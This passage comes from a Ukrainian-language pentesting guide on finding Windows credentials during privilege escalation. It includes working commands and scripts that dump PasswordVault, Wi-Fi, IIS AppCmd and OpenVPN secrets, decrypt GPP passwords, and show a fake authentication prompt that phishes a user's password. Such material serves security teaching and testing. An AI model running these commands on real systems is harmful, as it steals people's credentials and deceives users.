Зверніть увагу на mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) або модуль [Empire Powershells](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### UWP PasswordVault / Credential Locker

Сучасні програми Windows UWP, Microsoft Edge і сучасні системні служби зберігають токени автентифікації та паролі у відкритому вигляді в `PasswordVault` платформи Universal Windows Platform (UWP) (також відомому як `Web Credentials` у `vaultcmd`). Це сховище ізольоване в межах сеансу, і його вміст можна розшифрувати нативними засобами без прав адміністратора або `SeDebugPrivilege`.

Виконайте цю команду PowerShell в активному сеансі користувача, щоб миттєво отримати всі збережені імена користувачів і паролі у відкритому вигляді та розшифрувати їх:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

**Data Protection API (DPAPI)** надає метод симетричного шифрування даних, який переважно використовується в операційній системі Windows для симетричного шифрування асиметричних закритих ключів. Для значного збільшення ентропії під час шифрування використовується секрет користувача або системи.

**DPAPI дає змогу шифрувати ключі за допомогою симетричного ключа, похідного від секретів входу користувача**. У сценаріях із системним шифруванням використовуються секрети доменної автентифікації системи.

Зашифровані RSA-ключі користувача, для яких використовується DPAPI, зберігаються в каталозі `%APPDATA%\Microsoft\Protect\{SID}`, де `{SID}` — це [ідентифікатор безпеки](https://en.wikipedia.org/wiki/Security_Identifier) користувача. **Ключ DPAPI, розташований поруч із головним ключем, який захищає закриті ключі користувача в тому самому файлі**, зазвичай складається з 64 байтів випадкових даних. (Важливо зауважити, що доступ до цього каталогу обмежений, тому переглянути його вміст за допомогою команди `dir` у CMD не можна, але це можна зробити через PowerShell).

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

Можна скористатися **модулем mimikatz** `dpapi::masterkey` з відповідними аргументами (`/pvk` або `/rpc`), щоб розшифрувати його.

**Файли облікових даних, захищені головним паролем,** зазвичай розташовані в:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

You can use **mimikatz module** `dpapi::cred` with the appropriate `/masterkey` to decrypt.\
You can **extract many DPAPI** **masterkeys** from **пам’яті** with the `sekurlsa::dpapi` module (if you are root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### Облікові дані PowerShell

**Облікові дані PowerShell** часто використовуються для **скриптів** і завдань автоматизації як зручний спосіб зберігання зашифрованих облікових даних. Вони захищені за допомогою **DPAPI**, що зазвичай означає, що розшифрувати їх може лише той самий користувач на тому самому комп’ютері, на якому їх було створено.

Експортований файл облікових даних може мати довільну назву або шлях `.xml`. Якщо скрипт або інвентаризація файлів вказує на нього, визначте фактичний каталог профілю облікового запису, а не припускайте, що це `C:\Users`: [Windows може розміщувати профілі в інших місцях](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory). Файл, який можна прочитати, — це лише зачіпка; [Windows `Export-Clixml` прив’язує зашифровані облікові дані до користувача та комп’ютера, які виконали експорт](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml), а відновлений обліковий запис окремо має мати дійсні права на потрібній службі. Спочатку перевірте шляхи та ACL, не виводячи зашифровані чи відкриті значення під час звичайного переліку.

Щоб **розшифрувати** облікові дані PS із файлу, у якому вони зберігаються, виконайте:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wi-Fi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### Збережені RDP-підключення

Їх можна знайти в `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\
та в `HKCU\Software\Microsoft\Terminal Server Client\Servers`

### Нещодавно виконані команди

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **Диспетчер облікових даних віддаленого робочого столу**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

Use the **Mimikatz** модуль `dpapi::rdg` з відповідним `/masterkey`, щоб **розшифрувати будь-які файли .rdg**\
За допомогою модуля Mimikatz `sekurlsa::dpapi` можна **витягти з пам’яті багато головних ключів DPAPI**

**mRemoteNG використовує інше сховище підключень.** Перегляньте доступні для читання XML-файли в `%APPDATA%\mRemoteNG` і документах користувача, зокрема файли зі звичайними назвами, як-от `config.xml`. Визначте схему підключень і зашифровані атрибути `Password`, перш ніж розглядати XML-файл як можливе джерело облікових даних. Збережене значення — це не пароль DPAPI/RDCMan; можливість його відновлення залежить від параметрів шифрування файлу та від того, чи використовувався власний головний пароль. Під час широкого пошуку не виводьте зашифровані значення.

**Експортовані профілі Remote Desktop Plus** також можуть бути доступні для читання в каталогах користувачів або спільній папці адміністрування. Експортований застарілий файл `profiles.xml` містить записи `Data/Profile` з елементами `ProfileName`, `Password` і `Secure`. Розглядайте непорожній елемент пароля як можливе джерело облікових даних, не виводячи його та не припускаючи, що це відкритий текст: [у документації постачальника](https://www.donkz.nl/) зазначено, що захист профілю може бути прив’язаний до облікового запису й комп’ютера, на якому його створено, або налаштований менш суворо. Перш ніж покладатися на цей файл, з’ясуйте його походження та умови відновлення.

### Sticky Notes

Іноді люди зберігають паролі та іншу інформацію в застосунках для нотаток. Упакований застосунок Sticky Notes від Microsoft зазвичай зберігає нотатки в `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`; старіші чи інші застосунки можуть використовувати інші сховища в профілі користувача, зокрема LevelDB. Перш ніж вважати відсутність файлу SQLite ознакою відсутності нотаток, визначте встановлений застосунок і формат сховища.

Якщо Sticky Notes використовує журналювання SQLite з випереджальним записом (WAL), копія лише `plum.sqlite` може не містити нещодавно зафіксованих нотаток. Зберігайте відповідний `plum.sqlite-wal` разом із узгодженою копією бази даних і, якщо доступний, додайте `plum.sqlite-shm`; індекс спільної пам’яті можна відновити, але WAL є частиною постійного стану бази даних. Див. [документацію SQLite про WAL](https://www.sqlite.org/wal.html). Нотатка з назвою облікового запису чи паролем — лише можливе джерело облікових даних: окремо перевірте обліковий запис, дозволений доступ і повторне використання пароля. Для запису із зашифрованого менеджера паролів також потрібні його фактичний ключ розшифрування та інтерпретація, специфічна для застосунку, перш ніж такий запис можна буде вважати підтвердженням входу з вищими привілеями.

### AppCmd.exe

**Зверніть увагу: для відновлення паролів з AppCmd.exe потрібні права адміністратора та запуск із рівнем цілісності High.**\
**AppCmd.exe** розташований у каталозі `%systemroot%\system32\inetsrv\`.\
Якщо цей файл існує, можливо, було налаштовано певні **облікові дані**, які можна **відновити**.

Цей код взято з [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

Перевірте, чи існує `C:\Windows\CCM\SCClient.exe`.\
**Інсталятори запускаються з привілеями SYSTEM**, багато з них вразливі до **DLL Sideloading (інформація з** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Файли та реєстр (облікові дані)

### Артефакти облікових даних у реєстрі інструментів підтримки

Деякі старі інсталяції засобів віддаленої підтримки зберігають назви значень, пов’язаних із паролями, у фіксованих ключах реєстру програм. Наприклад, згідно з [поясненням постачальника щодо ключа реєстру](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988), у версіях TeamViewer до 9 включно `SecurityPasswordAES` вказував на налаштований статичний пароль сеансу. Маркер у назві значення — лише підказка для перевірки: перш ніж оцінювати ці облікові дані, перевірте встановлену версію, доступність даних значення для читання, їхній формат і поточну поведінку автентифікації. Перехід від пароля засобу віддаленої підтримки до облікового запису Windows із вищими привілеями додатково потребує фактичного повторного використання пароля та наявності прав для цього облікового запису. Не виводьте шифротекст і відновлені паролі під час звичайного переліку.

### Спільні електронні таблиці із захищеними аркушами

Якщо є підозра, що доступна для читання спільна книга містить дані облікових записів, розрізняйте **шифрування файлу** та захист аркуша чи приховані стовпці. [Microsoft зазначає](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel), що захист аркуша контролює редагування й не є функцією безпеки; сам по собі він не доводить, що вміст книги зашифровано. Переглядайте лише дозволені й релевантні файли та не виводьте можливі секрети під час широкого переліку. Шлях до доступного для читання файлу `.xlsx`, захищений аркуш або прихований стовпець самі по собі не доводять наявності облікових даних чи вищих привілеїв у будь-якого облікового запису; окремо перевірте фактичні дані й поточні права облікових записів.

### Збережені патчі змін на CI-сервері

CI-сервер може зберігати надіслані зміни вихідного коду у своєму каталозі даних навіть після завершення збірки. [TeamCity документує](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html) `system/changes` як місце зберігання змін для віддалених запусків; каталог даних можна налаштувати, і він не обов’язково розташований у `ProgramData`. Доступний для читання патч може містити вилучені або додані посилання на файл облікових даних, ключ шифрування або скрипт, що використовує і те, й інше. Наприклад, для робочого процесу PowerShell `ConvertTo-SecureString -Key` потрібен як ключ AES, так і зашифрований рядок; [Microsoft документує](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring), що ключ передається окремо. Спочатку переглядайте лише доступні назви патчів, а потім, маючи дозвіл, перевіряйте відповідний вміст, не виводячи секрети під час звичайного переліку. Шлях до патча, зашифроване значення або посилання на ключ самі по собі не доводять наявності дійсних облікових даних чи доступу з вищими привілеями. Обмежте ACL каталогу даних і не додавайте секрети до змін збірки.

### Власна ротація паролів локального адміністратора

Саморобний засіб ротації паролів може зберігати зашифрований пароль локального адміністратора в локальній службі, а облікові дані сховища даних — у доступному для читання файлі `.env` або поруч із двійковим файлом програми оновлення. Перевіряйте разом заплановане завдання програми оновлення, обліковий запис, ACL конфігурації, прослуховувач і права сховища даних. До сховища даних, прив’язаного лише до loopback-інтерфейсу, все одно може звернутися локальний користувач із дійсними обліковими даними, але сама автентифікація не доводить наявності прав на читання відповідних записів. Якщо початкове значення або матеріал ключа шифрування доступні поруч із шифротекстом, перш ніж покладатися на шифрування, перевірте точний спосіб отримання ключа. Схема, що детерміновано отримує ключ AES з відкритого початкового значення за допомогою Go [`math/rand`](https://pkg.go.dev/math/rand), непридатна для захисту такого пароля; у документації Go зазначено, що цей пакет не підходить для генерації випадкових чисел у сценаріях, чутливих до безпеки. Перш ніж вважати будь-який відновлений пароль шляхом підвищення привілеїв, переконайтеся, що він актуальний і належить обліковому запису з групи локальних адміністраторів. Заплановане завдання, шлях до `.env` або зашифрований блок самі по собі не доводять жодної з цих умов. Не виводьте паролі й матеріал ключа під час звичайного переліку.

Використовуйте [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview) для керованих паролів локальних адміністраторів. Його сховище на основі каталогу або Entra та засоби контролю доступу відрізняються від власного локального сховища даних; так само [ролі Elasticsearch](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) визначають, чи може автентифікований користувач сховища даних читати певний індекс.

### Архіви плагінів Java-сервера та повторне використання облікових даних

Деякі плагіни Java-серверів постачаються як архіви JAR у каталозі сервера `plugins`. Доступний для читання власний плагін може містити конфігурацію або байткод із вбудованими обліковими даними служби. Переглядайте архів лише за наявності дозволу й не виводьте відновлені секрети під час звичайного переліку. Сам шлях до плагіна не доводить наявності секрету, а відновлений пароль служби веде до вищих привілеїв лише тоді, коли він також дійсний для облікового запису з вищими привілеями. Перевірте відповідні ACL файлів і замініть повторно використані облікові дані на окремі секрети. Див. [посібник PaperMC зі встановлення плагінів](https://docs.papermc.io/paper/adding-plugins/) щодо структури каталогів і [документацію Oracle щодо JAR](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html) щодо вмісту архівів.

### Облікові дані вбудованої бази даних Openfire

Інсталяція Openfire, що використовує вбудовану базу даних, може зберігати `openfire.script` у `Openfire\embedded-db`. Якщо поточний обліковий запис може читати цей файл, перевірте записи `OFUSER` і властивість `passwordKey` разом. У [документації Openfire щодо постачальника користувачів](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html) зазначено, що паролі можуть зберігатися у відкритому вигляді або шифруватися ключем, який зберігається в цій властивості. Відновлений пароль має значення для підвищення привілеїв лише тоді, коли він досі дійсний для облікового запису з вищими привілеями; сама назва файлу не доводить ані наявності доступу для читання, ані повторного використання облікових даних. Шлях — це лише підказка для інвентаризації, тому не виводьте вміст бази даних і облікові дані під час звичайного переліку.

Окремий файл `Openfire\conf\openfire.xml` може показати налаштовані порти консолі адміністратора та інтерфейс прив’язки, навіть якщо використовується зовнішня база даних. Openfire зазвичай прив’язує консоль адміністратора до loopback-інтерфейсу; за умови, що прослуховувач запущений, локальний обліковий запис усе одно може звернутися до цієї адреси. Разом перевірте фактичний прослуховувач, авторизовану роль адміністратора, політику завантаження плагінів і обліковий запис служби Openfire. Адміністратор, який може встановлювати плагіни, може спричинити виконання коду плагіна в контексті служби; це може означати високі привілеї, якщо служба працює від імені LocalSystem. Пароль, що збігається з паролем іншого облікового запису, або доступний для читання шлях до конфігурації самі по собі не доводять доступу до консолі адміністратора чи виконання коду. Див. [посібник постачальника зі встановлення та керування плагінами](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) і [властивість API завантаження плагінів](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html).

### Конфігурація сервера керування цифровою криміналістикою

Конфігурації сервера Velociraptor, які зазвичай мають назву `server.config.yaml`, можуть містити `CA.private_key` внутрішнього центру сертифікації. Якщо користувач із нижчими привілеями може читати цей ключ, він може мати змогу створити клієнтський сертифікат API. Чи призведе це до вищих привілеїв, залежить від ролей користувачів на сервері, доступності API та ідентичності, від імені якої працює сервер або цільовий агент. Клієнтська конфігурація містить інші дані; її наявність не доводить доступу до центру сертифікації сервера. У деяких розгортаннях закритий ключ центру сертифікації зберігається офлайн, тому доступна для читання конфігурація сервера може не містити ключа підпису.

На сервері Windows перевірте ACL **серверної** конфігурації в каталозі інсталяції та будь-яких захищених резервних копій. Одне з можливих розташувань — `%ProgramFiles%\VelociraptorServer\server.config.yaml`; якщо налаштований шлях служби відрізняється, використовуйте його. Переконайтеся, що поточна ідентичність може читати файл і що `CA.private_key` справді присутній. Не виводьте закритий ключ у журнали чи результати переліку. Робочий процес постачальника `config api_client` використовує ключ центру сертифікації для випуску клієнтського сертифіката, але також потрібна ефективна роль на сервері; її створення або змінення може вимагати прав на запис у сховище даних або перезапуску. Наявна привілейована ідентичність сервера може надати шлях, навіть якщо такі записи недоступні. Запити API з правами на виконання запускаються в контексті відповідного сервера або агента, який може мати високі привілеї.

Захищайте конфігурацію сервера та резервні копії за допомогою обмежувальних ACL, за можливості зберігайте ключ підпису центру сертифікації офлайн і обмежуйте ролі API та доступ до прослуховувача. Див. [документацію Velociraptor API](https://docs.velociraptor.app/docs/server_automation/server_api/) і [рекомендації з налаштування безпеки](https://docs.velociraptor.app/docs/deployment/security/).

### Облікові дані PuTTY

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTY — це окремий менеджер сеансів. Його власне зашифроване сховище може міститися в `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat`, а експортована резервна копія сеансів може мати назву `sessions-backup.dat` і зберігатися в іншому місці. [Посібник SolarWinds з експорту](https://thwack.solarwinds.com/discussion/comment/115591) зазначає, що експортовані дані зашифровані паролем і можуть містити сеанси, ключі, скрипти, теги та зв’язки між ними; у [форумі підтримки](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) вказано розташування власного сховища. Спершу перевірте дозволи на файли та шляхи. Виявлення будь-якого з цих файлів не розкриває пароль і не доводить, що будь-які збережені облікові дані досі дійсні або мають вищі привілеї.

### Ключі SSH-хостів PuTTY

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### SSH-ключі в реєстрі

Приватні SSH-ключі можуть зберігатися в розділі реєстру `HKCU\Software\OpenSSH\Agent\Keys`, тож перевірте, чи є там щось цікаве:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

Якщо в цьому шляху знайдете будь-який запис, імовірно, це збережений SSH-ключ. Він зберігається в зашифрованому вигляді, але його можна легко розшифрувати за допомогою [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Додаткова інформація про цю техніку: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

Якщо служба `ssh-agent` не запущена і ви хочете, щоб вона запускалася автоматично під час завантаження системи, виконайте:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> Схоже, ця техніка більше не працює. Я спробував створити кілька ssh-ключів, додати їх за допомогою `ssh-add` і увійти на машину через ssh. Розділу реєстру HKCU\Software\OpenSSH\Agent\Keys не існує, а procmon не виявив використання `dpapi.dll` під час автентифікації за допомогою асиметричного ключа.

### Файли автоматизованого встановлення

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

Також можна шукати ці файли за допомогою **metasploit**: _post/windows/gather/enum_unattend_

Приклад вмісту:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### Резервні копії SAM і SYSTEM

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

Читабельні резервні копії Windows Imaging (`.wim`) також можуть містити офлайн-кущі реєстру `SAM`, `SECURITY` і `SYSTEM`. Насамперед перевіряйте локально доступні каталоги резервних копій або образів і перед розпакуванням перегляньте **імена файлів в образі**; сама назва файлу `.wim` не доводить, що в ньому доступні кущі реєстру, а звичайні `install.wim`, `boot.wim` і образи відновлення часто виявляються хибними зачіпками. SMB-ресурс — це окремий шлях доступу, який слід перевіряти лише тоді, коли цей ресурс входить до меж тестування. Див. рекомендації Microsoft щодо [образів Windows](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) і [довідник файлів кущів реєстру](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives).

### Хмарні облікові дані

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

Знайдіть файл із назвою **SiteList.xml**

### Cached GPP Password

Раніше була доступна функція, яка дозволяла розгортати власні облікові записи локального адміністратора на групі комп’ютерів за допомогою Group Policy Preferences (GPP). Однак цей метод мав серйозні вади безпеки. По-перше, об’єкти групової політики (GPO), що зберігалися як XML-файли в SYSVOL, були доступні будь-якому користувачеві домену. По-друге, будь-який автентифікований користувач міг розшифрувати паролі в цих GPP, зашифровані за допомогою AES256 із загальнодоступним ключем за замовчуванням. Це становило серйозний ризик, оскільки могло дозволити користувачам отримати підвищені привілеї.

Щоб зменшити цей ризик, було розроблено функцію для пошуку локально кешованих файлів GPP, які містять непорожнє поле "cpassword". Якщо такий файл знаходився, функція розшифровувала пароль і повертала власний об’єкт PowerShell. Цей об’єкт містить відомості про GPP і розташування файлу, що допомагає виявити й усунути цю вразливість безпеки.

Знайдіть такі файли в `C:\ProgramData\Microsoft\Group Policy\history` або в _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (до W Vista)_:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Щоб розшифрувати cPassword:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

Використання crackmapexec для отримання паролів:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### Конфігурація вебсайту IIS

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

Приклад web.config з обліковими даними:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### Резервні архіви в кореневому каталозі вебсайту IIS

Старий ZIP-архів резервної копії, розміщений безпосередньо в кореневому каталозі вебсайту, може розкрити попередні файли конфігурації та облікові дані, які можна повторно використати. Перевірте налаштований фізичний шлях сайту та чи справді архів доступний через HTTP, перш ніж вважати це витоком. Шлях за замовчуванням `C:\inetpub\wwwroot` — лише можливий варіант. Швидка локальна інвентаризація може вивести назви й розміри файлів, не відкриваючи архіви:

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

Назва архіву не доводить, що він містить секрет, або що отримані облікові дані надають вищі привілеї.

### Облікові дані OpenVPN

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### Журнали

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Запитати облікові дані

Завжди можна **попросити користувача ввести свої облікові дані або навіть облікові дані іншого користувача**, якщо ви думаєте, що він може їх знати (зауважте, що безпосередньо **просити** клієнта надати **облікові дані** — справді **ризиковано**):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **Можливі імена файлів, що містять облікові дані**

Відомі файли, які колись містили **паролі** у **відкритому тексті** або Base64

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Бази Password Safe v3 зазвичай мають розширення `.psafe3`. Вважайте файл із відповідною назвою кандидатом на зашифроване сховище; його наявність не означає, що ви можете прочитати його, розблокувати або скористатися збереженими обліковими даними. Під час перевірки місць зберігання таких файлів перевірте доступні профілі користувачів і налаштовані корені спільного доступу до файлів.

